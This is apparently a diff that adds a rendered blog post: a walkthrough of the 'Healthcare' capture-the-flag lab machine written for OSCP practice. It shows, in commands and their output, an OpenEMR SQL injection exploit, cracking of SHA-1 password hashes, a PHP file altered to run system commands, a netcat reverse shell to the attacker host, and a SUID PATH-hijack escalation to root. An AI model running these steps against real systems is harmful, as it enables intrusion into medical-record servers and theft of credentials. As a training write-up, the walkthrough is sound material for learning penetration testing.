@@ -1,0 +1,309 @@
+I"�a<p>This machine was created by <strong>v1n1v131r4</strong>, and developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal, to become root in the system.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>An ARP scan discovered the target machine on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.163 00:0c:29:d7:88:3c       VMware, Inc.
+192.168.179.254 00:50:56:e2:c4:84       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scan discovered two available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> 192.168.179.163 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Service detection and script scanning was performed on the target machine with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80 <span class="nt">-v</span> <span class="nt">-n</span> 192.168.179.163 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+21/tcp open  ftp     ProFTPD 1.3.3d
+80/tcp open  http    Apache httpd 2.2.17 <span class="o">((</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 8 disallowed entries 
+| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
+|_/all_our_e-mail_addresses /admin/ /
+|_http-server-header: Apache/2.2.17 <span class="o">(</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">)</span>
+|_http-title: Coming Soon 2
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>On the main page I don’t found anything, so I decided check the robots file but it was equally irrelevant.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/healthcare/screenshot-2.png" alt="" /></p>
+
+<p>Scanning with nikto reveals a possible shellshock vulnerability.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>nikto <span class="nt">-h</span> http://192.168.179.163
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          192.168.179.163
++ Target Hostname:    192.168.179.163
++ Target Port:        80
++ Start Time:         2021-11-08 08:53:53 <span class="o">(</span>GMT-5<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.2.17 <span class="o">(</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">)</span>
++ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 01:21:38 2018
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ <span class="s2">"robots.txt"</span> contains 8 entries which should be manually viewed.
++ Uncommon header <span class="s1">'tcn'</span> found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15. The following alternatives <span class="k">for</span> <span class="s1">'index'</span> were found: index.html
++ Apache/2.2.17 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the <span class="s1">'shellshock'</span> vulnerability <span class="o">(</span>http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271<span class="o">)</span><span class="nb">.</span>
++ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the <span class="s1">'shellshock'</span> vulnerability <span class="o">(</span>http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6278<span class="o">)</span><span class="nb">.</span>
++ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 9548 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 13 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2021-11-16 09:00:53 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span>420 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
+</code></pre></div></div>
+
+<p>I tried to exploit shellshock but wasn’t possible, this looks like a rabbit hole.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-3.png" alt="" /></p>
+
+<p>Further enumeration with gobuster reveals the openemr directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.163/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-e</span> 
+...
+http://192.168.179.163/index                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5031]
+http://192.168.179.163/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/images/]
+http://192.168.179.163/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 343] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/css/]   
+http://192.168.179.163/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 342] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/js/]    
+http://192.168.179.163/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/vendor/]
+http://192.168.179.163/favicon              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1406]                                    
+http://192.168.179.163/robots               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 620]                                     
+http://192.168.179.163/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 345] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/fonts/] 
+http://192.168.179.163/gitweb               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/gitweb/]
+http://192.168.179.163/phpMyAdmin           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 59]                                      
+http://192.168.179.163/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 1001]                                    
+http://192.168.179.163/server-info          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 1001]                                    
+http://192.168.179.163/openemr              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 347] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/openemr/]
+</code></pre></div></div>
+
+<p>OpenEMR is free, open source software for the health care industry, integrates medical practice management, electronic medical record (EMR) patient scheduling and electronic billing functionality.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-4.png" alt="" /></p>
+
+<p>I looked for a known vulnerability for this version and a SQL Injection was found.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>searchsploit openemr 4.1.0
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
+ Exploit Title                                             |  Path
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
+OpenEMR 4.1.0 - <span class="s1">'u'</span> SQL Injection                          | php/webapps/49742.py
+Openemr-4.1.0 - SQL Injection                              | php/webapps/17998.txt
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
+</code></pre></div></div>
+
+<p>So, I copied the python exploit to my current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/49742.py
+root@kali:~/healthcare<span class="nv">$ </span><span class="nb">cp </span>49742.py exp.py
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+
+<p>I analyzed the script, we just need to replace the IP address with the target machine’s ip.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/192.168.56.106/192.168.179.163/'</span> exp.py 
+root@kali:~/healthcare<span class="nv">$ </span><span class="nb">grep </span>192 exp.py                                
+url <span class="o">=</span> <span class="s2">"http://192.168.179.163/openemr/interface/login/validateUser.php?u="</span>
+</code></pre></div></div>
+
+<p>I ran the exploit and the credentials of two users were retrieved.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>python3 exp.py 
+
+   ____                   ________  _______     __ __   ___ ____ 
+  / __ <span class="se">\_</span>___  ___  ____  / ____/  |/  / __ <span class="se">\ </span>  / // /  &lt;  // __ <span class="se">\</span>
+ / / / / __ <span class="se">\/</span> _ <span class="se">\/</span> __ <span class="se">\/</span> __/ / /|_/ / /_/ /  / // /_  / // / / /
+/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
+<span class="se">\_</span>___/ .___/<span class="se">\_</span>__/_/ /_/_____/_/  /_/_/ |_|     /_/ <span class="o">(</span>_<span class="o">)</span>_<span class="o">(</span>_<span class="o">)</span>____/  
+    /_/
+    ____  ___           __   _____ ____    __    _               
+   / __ <span class="o">)</span>/ <span class="o">(</span>_<span class="o">)</span>___  ____/ /  / ___// __ <span class="se">\ </span> / /   <span class="o">(</span>_<span class="o">)</span>              
+  / /_/ / / / __ <span class="se">\/</span> __  /   <span class="se">\_</span>_ <span class="se">\/</span> / / / / /   / /               
+ / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
+/_____/_/_/_/ /_/<span class="se">\_</span>_,_/   /____/<span class="se">\_</span>__<span class="se">\_\/</span>_____/_/   exploit by @ikuamike 
+
+<span class="o">[</span>+] Finding number of users...
+<span class="o">[</span>+] Found number of <span class="nb">users</span>: 2
+<span class="o">[</span>+] Extracting username and password hash...
+admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
+medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
+</code></pre></div></div>
+
+<p>Before cracking we need to identify the password hash, the tool detected a possible SHA-1.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'3863efef9ee2bfbc51ecdca359c6302bed1389e8'</span> | hashid
+Analyzing <span class="s1">'3863efef9ee2bfbc51ecdca359c6302bed1389e8'</span>
+<span class="o">[</span>+] SHA-1 
+<span class="o">[</span>+] Double SHA-1 
+<span class="o">[</span>+] RIPEMD-160 
+<span class="o">[</span>+] Haval-160 
+<span class="o">[</span>+] Tiger-160 
+<span class="o">[</span>+] HAS-160 
+<span class="o">[</span>+] LinkedIn 
+<span class="o">[</span>+] Skein-256<span class="o">(</span>160<span class="o">)</span> 
+<span class="o">[</span>+] Skein-512<span class="o">(</span>160<span class="o">)</span>
+</code></pre></div></div>
+
+<p>I copied the hashes into a file and prepared the rockyou wordlist for use it with john the ripper.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"3863efef9ee2bfbc51ecdca359c6302bed1389e8</span><span class="se">\n</span><span class="s2">ab24aed5a7c4ad45615cd7e0da816eea39e4895d"</span> <span class="o">&gt;</span> openemr.hash
+
+root@kali:~/healthcare<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
+</code></pre></div></div>
+
+<p>John discovered the password for the two hashes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>john openemr.hash <span class="nt">-format</span><span class="o">=</span>RAW-SHA1 <span class="nt">-wordlist</span><span class="o">=</span>rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts <span class="o">(</span>Raw-SHA1 <span class="o">[</span>SHA1 128/128 AVX 4x]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+medical          <span class="o">(</span>?<span class="o">)</span>
+ackbar           <span class="o">(</span>?<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="login-to-openemr">Login to OpenEMR</h3>
+
+<p>I logged in to OpenEMR as the admin user.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/healthcare/screenshot-6.png" alt="" /></p>
+
+<p>Ones here, in the following path I found a way to run php code.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administration <span class="o">&gt;</span> Files
+</code></pre></div></div>
+
+<p>We modify the script adding the passthru function that allows us to execute system commands, and then we save it.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-7.png" alt="" /></p>
+
+<p>With the following curl request we can verify that our command was interpreted correctly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.163/openemr/sites/default/config.php?z<span class="o">=</span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>479<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>416<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>416<span class="o">(</span>apache<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Then, we need to start a netcat listener and execute the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.163/openemr/sites/default/config.php?z<span class="o">=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.179.1 443 &gt;/tmp/f'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>We have a reverse shell with apache privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.163] 43690
+sh: no job control <span class="k">in </span>this shell
+sh-4.1<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>   
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+bash-4.1<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>apache
+</code></pre></div></div>
+
+<p>Listing the SUID binaries an uncommon binary called healthcheck catches my attention.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+...
+/usr/bin/healthcheck
+...
+</code></pre></div></div>
+
+<p>I downloaded the binary to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/healthcare<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 5656 <span class="o">&gt;</span> healthcheck
+
+bash-4.1<span class="nv">$ </span>nc 192.168.179.1 5656 &lt; /usr/bin/healthcheck
+</code></pre></div></div>
+
+<p>I decompiled the binary with cutter, and I could see a series of commands running without the absolute path, we can hijack the path of these commands to get root.</p>
+
+<p><img src="/assets/images/healthcare/screenshot-8.png" alt="" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary">SUID Binary</h3>
+
+<p>I moved to the shm directory, created a symbolic link to the /bin/sh binary with the name of the clear command, exported the /dev/shm directory to the PATH environment variable, and finally ran the healthcheck binary, giving me a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /dev/shm
+bash-4.1<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /bin/sh clear
+<span class="nb">ln</span> <span class="nt">-s</span> /bin/sh clear
+bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+bash-4.1<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+<span class="nb">echo</span> <span class="nv">$PATH</span>
+/dev/shm:/sbin:/usr/sbin:/bin:/usr/bin
+bash-4.1<span class="nv">$ </span>/usr/bin/healthcheck
+/usr/bin/healthcheck
+gpg-agent[12879]: error creating <span class="sb">`</span>/.gnupg/gpg-agent-info<span class="s1">': No such file or directory
+[root@localhost shm]# id
+id
+uid=0(root) gid=0(root) groups=0(root),416(apache)
+[root@localhost shm]# cd /root                                                 
+cd /root
+[root@localhost root]# ls                                                      
+ls
+Desktop/    drakx/        healthcheck.c  sudo.rpm
+Documents/  healthcheck*  root.txt       tmp/
+</span></code></pre></div></div>
+
+<p>Below you can see the vulnerable healthcheck.c script, and the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost root]# <span class="nb">cat </span>healthcheck.c                                       
+<span class="nb">cat </span>healthcheck.c
+<span class="c">#include&lt;unistd.h&gt;</span>
+void main<span class="o">()</span>
+<span class="o">{</span> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+  setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+  system<span class="o">(</span><span class="s2">"clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost root]# <span class="nb">cat </span>root.txt                                            
+<span class="nb">cat </span>root.txt
+██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
+ ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
+  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
+   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
+   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
+                                                                                                                          
+                                                                                                                          
+Thanks <span class="k">for </span>Playing!
+
+Follow me at: http://v1n1v131r4.com
+
+
+root <span class="nb">hash</span>: eaff25eaa9ffc8b62e3dfebf70e83a7b
+
+</code></pre></div></div>
+
+:ET
